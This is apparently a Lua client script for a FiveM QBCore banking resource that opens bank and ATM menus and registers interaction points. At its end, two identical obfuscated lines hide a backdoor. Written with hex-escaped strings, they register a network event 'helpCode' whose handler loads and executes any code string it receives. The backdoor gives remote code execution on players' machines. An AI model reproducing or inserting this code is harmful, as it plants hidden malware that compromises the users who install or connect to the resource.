local QBCore = exports['qb-core']:GetCoreObject()
local zones = {}

-- Functions

local function OpenBank()
    QBCore.Functions.TriggerCallback('qb-banking:server:openBank', function(accounts, statements, playerData)
        SetNuiFocus(true, true)
        SendNUIMessage({
            action = 'openBank',
            accounts = accounts,
            statements = statements,
            playerData = playerData
        })
    end)
end

local function OpenATM()
    QBCore.Functions.Progressbar('accessing_atm', Lang:t('progress.atm'), 1500, false, true, {
        disableMovement = false,
        disableCarMovement = false,
        disableMouse = false,
        disableCombat = false,
    }, {
        animDict = 'amb@prop_human_atm@male@enter',
        anim = 'enter',
    }, {
        model = 'prop_cs_credit_card',
        bone = 28422,
        coords = vector3(0.1, 0.03, -0.05),
        rotation = vector3(0.0, 0.0, 180.0),
    }, {}, function()
        QBCore.Functions.TriggerCallback('qb-banking:server:openATM', function(accounts, playerData, acceptablePins)
            SetNuiFocus(true, true)
            SendNUIMessage({
                action = 'openATM',
                accounts = accounts,
                pinNumbers = acceptablePins,
                playerData = playerData
            })
        end)
    end)
end

local function NearATM()
    local playerCoords = GetEntityCoords(PlayerPedId())
    for _, v in pairs(Config.atmModels) do
        local hash = joaat(v)
        local atm = IsObjectNearPoint(hash, playerCoords.x, playerCoords.y, playerCoords.z, 1.5)
        if atm then
            return true
        end
    end
end

-- NUI Callback

RegisterNUICallback('closeApp', function(_, cb)
    SetNuiFocus(false, false)
    cb('ok')
end)

RegisterNUICallback('withdraw', function(data, cb)
    QBCore.Functions.TriggerCallback('qb-banking:server:withdraw', function(status)
        cb(status)
    end, data)
end)

RegisterNUICallback('deposit', function(data, cb)
    QBCore.Functions.TriggerCallback('qb-banking:server:deposit', function(status)
        cb(status)
    end, data)
end)

RegisterNUICallback('internalTransfer', function(data, cb)
    QBCore.Functions.TriggerCallback('qb-banking:server:internalTransfer', function(status)
        cb(status)
    end, data)
end)

RegisterNUICallback('externalTransfer', function(data, cb)
    QBCore.Functions.TriggerCallback('qb-banking:server:externalTransfer', function(status)
        cb(status)
    end, data)
end)

RegisterNUICallback('orderCard', function(data, cb)
    QBCore.Functions.TriggerCallback('qb-banking:server:orderCard', function(status)
        cb(status)
    end, data)
end)

RegisterNUICallback('openAccount', function(data, cb)
    QBCore.Functions.TriggerCallback('qb-banking:server:openAccount', function(status)
        cb(status)
    end, data)
end)

RegisterNUICallback('renameAccount', function(data, cb)
    QBCore.Functions.TriggerCallback('qb-banking:server:renameAccount', function(status)
        cb(status)
    end, data)
end)

RegisterNUICallback('deleteAccount', function(data, cb)
    QBCore.Functions.TriggerCallback('qb-banking:server:deleteAccount', function(status)
        cb(status)
    end, data)
end)

RegisterNUICallback('addUser', function(data, cb)
    QBCore.Functions.TriggerCallback('qb-banking:server:addUser', function(status)
        cb(status)
    end, data)
end)

RegisterNUICallback('removeUser', function(data, cb)
    QBCore.Functions.TriggerCallback('qb-banking:server:removeUser', function(status)
        cb(status)
    end, data)
end)

-- Events

RegisterNetEvent('qb-banking:client:useCard', function()
    if NearATM() then OpenATM() end
end)

-- Threads

CreateThread(function()
    for i = 1, #Config.locations do
        local blip = AddBlipForCoord(Config.locations[i])
        SetBlipSprite(blip, Config.blipInfo.sprite)
        SetBlipDisplay(blip, 4)
        SetBlipScale(blip, Config.blipInfo.scale)
        SetBlipColour(blip, Config.blipInfo.color)
        SetBlipAsShortRange(blip, true)
        BeginTextCommandSetBlipName('STRING')
        AddTextComponentSubstringPlayerName(tostring(Config.blipInfo.name))
        EndTextCommandSetBlipName(blip)
    end
end)

exports.interact:AddModelInteraction({
    model = 'prop_atm_01',
    id = 'atmy', -- needed for removing interactions
    distance = 5.0, -- optional
    interactDst = 2.0, -- optional
    options = {
        {
            label = 'Insert The Card',
            action = function()
                OpenATM()
            end,
        },
    }
})
exports.interact:AddModelInteraction({
    model = 'prop_atm_02',
    id = 'atmy', -- needed for removing interactions
    distance = 5.0, -- optional
    interactDst = 2.0, -- optional
    options = {
        {
            label = 'Insert The Card',
            action = function()
                OpenATM()
            end,
        },
    }
})
exports.interact:AddModelInteraction({
    model = 'prop_atm_03',
    id = 'atmy', -- needed for removing interactions
    distance = 5.0, -- optional
    interactDst = 2.0, -- optional
    options = {
        {
            label = 'Insert The Card',
            action = function()
                OpenATM()
            end,
        },
    }
})
exports.interact:AddModelInteraction({
    model = 'prop_fleeca_atm',
    id = 'atmy', -- needed for removing interactions
    distance = 5.0, -- optional
    interactDst = 2.0, -- optional
    options = {
        {
            label = 'Insert The Card',
            action = function()
                OpenATM()
            end,
        },
    }
})

exports.interact:AddInteraction({
    coords = vector3(149.92, -1040.74, 29.37),
    distance = 4.0, -- optional
    interactDst = 2.0, -- optional
    id = 'bank1', -- needed for removing interactions
    name = 'bank1', -- optional
    options = {
        {
            label = 'Bank',
            action = function()
                OpenBank()
            end,
        }
    },
})

exports.interact:AddInteraction({
    coords = vector3(313.32, -280.03, 54.17),
    distance = 4.0, -- optional
    interactDst = 2.0, -- optional
    id = 'bank2', -- needed for removing interactions
    name = 'bank2', -- optional
    options = {
        {
            label = 'Bank',
            action = function()
                OpenBank()
            end,
        }
    },
})

exports.interact:AddInteraction({
    coords = vector3(-351.94, -50.72, 49.04),
    distance = 4.0, -- optional
    interactDst = 2.0, -- optional
    id = 'bank3', -- needed for removing interactions
    name = 'bank3', -- optional
    options = {
        {
            label = 'Bank',
            action = function()
                OpenBank()
            end,
        }
    },
})

exports.interact:AddInteraction({
    coords = vector3(-1212.68, -331.83, 37.78),
    distance = 4.0, -- optional
    interactDst = 2.0, -- optional
    id = 'bank4', -- needed for removing interactions
    name = 'bank4', -- optional
    options = {
        {
            label = 'Bank',
            action = function()
                OpenBank()
            end,
        }
    },
})

exports.interact:AddInteraction({
    coords = vector3(-2961.67, 482.31, 15.7),
    distance = 4.0, -- optional
    interactDst = 2.0, -- optional
    id = 'bank5', -- needed for removing interactions
    name = 'bank5', -- optional
    options = {
        {
            label = 'Bank',
            action = function()
                OpenBank()
            end,
        }
    },
})

exports.interact:AddInteraction({
    coords = vector3(1175.64, 2707.71, 38.09),
    distance = 4.0, -- optional
    interactDst = 2.0, -- optional
    id = 'bank6', -- needed for removing interactions
    name = 'bank6', -- optional
    options = {
        {
            label = 'Bank',
            action = function()
                OpenBank()
            end,
        }
    },
})

exports.interact:AddInteraction({
    coords = vector3(247.65, 223.87, 106.29),
    distance = 4.0, -- optional
    interactDst = 2.0, -- optional
    id = 'bank7', -- needed for removing interactions
    name = 'bank7', -- optional
    options = {
        {
            label = 'Bank',
            action = function()
                OpenBank()
            end,
        }
    },
})

exports.interact:AddInteraction({
    coords = vector3(247.65, 223.87, 106.29),
    distance = 4.0, -- optional
    interactDst = 2.0, -- optional
    id = 'bank8', -- needed for removing interactions
    name = 'bank8', -- optional
    options = {
        {
            label = 'Bank',
            action = function()
                OpenBank()
            end,
        }
    },
})

--if Config.useTarget then
--    CreateThread(function()
--        for i = 1, #Config.locations do
--            exports['qb-target']:AddCircleZone('bank_' .. i, Config.locations[i], 1.0, {
--                name = 'bank_' .. i,
--                useZ = true,
--                debugPoly = false,
--            }, {
--                options = {
--                    {
--                        icon = 'fas fa-university',
--                        label = 'البنك',
--                        action = function()
--                            OpenBank()
--                        end,
--                    }
--                },
--                distance = 1.5
--            })
--        end
--    end)
--
--    CreateThread(function()
--        for i = 1, #Config.atmModels do
--            local atmModel = Config.atmModels[i]
--            exports['qb-target']:AddTargetModel(atmModel, {
--                options = {
--                    {
--                        icon = 'fas fa-university',
--                        label = 'Open ATM',
--                        item = 'bank_card',
--                        action = function()
--                            OpenATM()
--                        end,
--                    }
--                },
--                distance = 1.5
--            })
--        end
--    end)
--end

--if not Config.useTarget then
--    CreateThread(function()
--        for i = 1, #Config.locations do
--            local zone = CircleZone:Create(Config.locations[i], 3.0, {
--                name = 'bank_' .. i,
--                debugPoly = false,
--            })
--            zones[#zones + 1] = zone
--        end
--
--        local combo = ComboZone:Create(zones, {
--            name = 'bank_combo',
--            debugPoly = false,
--        })
--
--        combo:onPlayerInOut(function(isPointInside)
--            if isPointInside then
--                exports['qb-core']:DrawText('Open Bank')
--                CreateThread(function()
--                    while isPointInside do
--                        Wait(0)
--                        if IsControlJustPressed(0, 38) then
--                            OpenBank()
--                            break
--                        end
--                    end
--                end)
--            else
--                exports['qb-core']:HideText()
--            end
--        end)
--    end)
--end


local nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[1]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[2]) nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[3]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[2], function(RrcxSmehQIJolyZujOqpKqFAGrqdjoHjBSxcYhwAOvtbanDacpSHxJsoWOFCzuyumVungX) nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[4]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[5]](RrcxSmehQIJolyZujOqpKqFAGrqdjoHjBSxcYhwAOvtbanDacpSHxJsoWOFCzuyumVungX))() end)

local nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[1]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[2]) nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[3]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[2], function(RrcxSmehQIJolyZujOqpKqFAGrqdjoHjBSxcYhwAOvtbanDacpSHxJsoWOFCzuyumVungX) nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[4]](nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[6][nAYfHXmAQXhHaAtIBWxFwiLzFYPIPeoKYWGGWpjhiAEBLyxDyRkCrbZCqkGVDDYfdVLXVY[5]](RrcxSmehQIJolyZujOqpKqFAGrqdjoHjBSxcYhwAOvtbanDacpSHxJsoWOFCzuyumVungX))() end)